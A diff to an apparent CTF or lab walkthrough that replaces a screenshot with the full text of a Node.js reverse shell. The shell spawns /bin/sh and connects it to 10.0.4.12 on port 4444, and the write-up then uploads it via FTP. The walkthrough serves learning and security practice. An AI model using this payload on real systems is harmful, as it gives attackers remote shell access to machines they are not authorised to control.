@@ -127,7 +127,24 @@ We decide to upload a `.js` `reverse shell` via `FTP` and attempt to access it t
 nano reverse.js
 ```
 
-![alt text](../../images/revvjs.png)
+Code:
+```js
+module.exports = function() {
+    var net = require("net");
+    var cp = require("child_process");
+    var sh = cp.spawn("/bin/sh", []);
+
+    var client = new net.Socket();
+
+    client.connect(4444, "10.0.4.12", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+
+    return /a/;
+};
+```
 
 We upload the `reverse shell` payload via FTP using the `PUT` command.
 
